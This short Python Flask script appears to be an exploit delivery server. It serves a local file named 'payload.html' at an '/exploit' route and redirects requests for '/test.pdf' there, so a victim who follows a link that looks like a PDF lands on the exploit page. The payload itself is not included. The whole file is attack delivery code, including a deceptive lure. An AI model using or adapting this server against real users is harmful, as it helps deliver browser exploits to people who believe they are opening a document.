from flask import Flask, redirect, Response

app = Flask(__name__)

@app.route('/exploit')
def exploit_page():
    f = open("payload.html", "r")
    PAYLOAD = f.read()
    f.close()
    return Response(PAYLOAD, mimetype='text/html')

@app.route('/test.pdf')
def redirect_to_exploit():
    return redirect('/exploit', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6969)